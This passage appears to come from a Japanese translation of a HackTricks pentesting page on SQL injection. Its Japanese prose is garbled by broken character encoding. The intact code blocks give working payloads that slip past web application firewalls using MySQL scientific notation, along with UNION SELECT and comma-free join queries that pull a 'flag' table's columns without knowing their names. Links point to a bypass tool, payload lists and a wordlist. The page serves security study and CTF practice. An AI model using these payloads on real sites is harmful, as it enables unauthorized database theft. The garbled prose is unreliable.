ã“ã®ãƒˆãƒªãƒƒã‚¯ã®è©³ç´°ãªèª¬æ˜ã¯ [gosecure blog](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/) ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
åŸºæœ¬çš„ã«ã€ç§‘å­¦çš„è¡¨è¨˜æ³•ã‚’äºˆæœŸã—ãªã„æ–¹æ³•ã§ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€WAF ã‚’ãƒã‚¤ãƒ‘ã‚¹ã§ãã¾ã™ï¼š
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### ã‚«ãƒ©ãƒ ååˆ¶é™ã®ãƒã‚¤ãƒ‘ã‚¹

ã¾ãšç¬¬ä¸€ã«ã€**å…ƒã®ã‚¯ã‚¨ãƒªã¨ãƒ•ãƒ©ã‚°ã‚’æŠ½å‡ºã—ãŸã„ãƒ†ãƒ¼ãƒ–ãƒ«ãŒåŒã˜æ•°ã®ã‚«ãƒ©ãƒ ã‚’æŒã£ã¦ã„ã‚‹å ´åˆ**ã€å˜ã«æ¬¡ã®ã‚ˆã†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™: `0 UNION SELECT * FROM flag`

ã‚«ãƒ©ãƒ åã‚’ä½¿ç”¨ã›ãšã«**ãƒ†ãƒ¼ãƒ–ãƒ«ã®ç¬¬ä¸‰ã‚«ãƒ©ãƒ ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½**ã§ã™ã€‚æ¬¡ã®ã‚ˆã†ãªã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã—ã¾ã™: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;` ã—ãŸãŒã£ã¦ã€sqlinjectionã§ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
ã¾ãŸã¯ **ã‚«ãƒ³ãƒãƒã‚¤ãƒ‘ã‚¹** ã‚’ä½¿ç”¨ã™ã‚‹ï¼š
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
ã“ã®ãƒˆãƒªãƒƒã‚¯ã¯[https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)ã‹ã‚‰å–ã‚‰ã‚Œã¾ã—ãŸã€‚

### WAFãƒã‚¤ãƒ‘ã‚¹ã‚µã‚¸ã‚§ã‚¹ã‚¿ãƒ¼ãƒ„ãƒ¼ãƒ«

{% embed url="https://github.com/m4ll0k/Atlas" %}

## ãã®ä»–ã®ã‚¬ã‚¤ãƒ‰

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ¤œå‡ºãƒªã‚¹ãƒˆ

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



â€‹

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)ã¯ã€**ã‚¹ãƒšã‚¤ãƒ³**ã§æœ€ã‚‚é–¢é€£æ€§ã®é«˜ã„ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ™ãƒ³ãƒˆã§ã‚ã‚Šã€**ãƒ¨ãƒ¼ãƒ­ãƒƒãƒ‘**ã§æœ€ã‚‚é‡è¦ãªã‚¤ãƒ™ãƒ³ãƒˆã®ä¸€ã¤ã§ã™ã€‚**æŠ€è¡“çš„çŸ¥è­˜ã®ä¿ƒé€²**ã‚’ä½¿å‘½ã¨ã—ã€ã“ã®ä¼šè­°ã¯ã‚ã‚‰ã‚†ã‚‹åˆ†é‡ã®æŠ€è¡“ã¨ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®å°‚é–€å®¶ã®ç†±ã„äº¤æµã®å ´ã§ã™ã€‚

{% embed url="https://www.rootedcon.com/" %}

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’é€ä¿¡ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
